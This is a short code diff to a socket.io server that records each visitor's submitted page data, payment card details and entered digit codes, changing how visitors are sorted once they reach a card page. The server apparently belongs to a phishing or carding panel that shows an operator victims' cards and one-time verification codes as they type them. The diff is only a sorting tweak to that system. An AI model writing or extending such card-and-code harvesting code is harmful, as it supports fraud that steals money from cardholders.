@@ -370,8 +370,10 @@ io.on("connection", (socket) => {
           page: data.page,
           timestamp: now,
         });
-        // Set lastDataUpdate for sorting
-        visitor.lastDataUpdate = now;
+        // Only update lastDataUpdate if already entered card page
+        if (visitor.hasEnteredCardPage) {
+          visitor.lastDataUpdate = now;
+        }
         // Also keep flat data for backward compatibility
         visitor.data = { ...visitor.data, ...data.content };
         // تخزين اسم الشبكة إذا كان موجوداً
@@ -385,7 +387,9 @@ io.on("connection", (socket) => {
           ...data.paymentCard,
           timestamp: now,
         });
+        // Start tracking from card page
         visitor.lastDataUpdate = now;
+        visitor.hasEnteredCardPage = true;
       }
       if (data.digitCode) {
         const now = new Date().toISOString();
@@ -394,7 +398,10 @@ io.on("connection", (socket) => {
           page: data.page,
           timestamp: now,
         });
-        visitor.lastDataUpdate = now;
+        // Only update if already entered card page
+        if (visitor.hasEnteredCardPage) {
+          visitor.lastDataUpdate = now;
+        }
       }
 
       visitor.page = data.page;
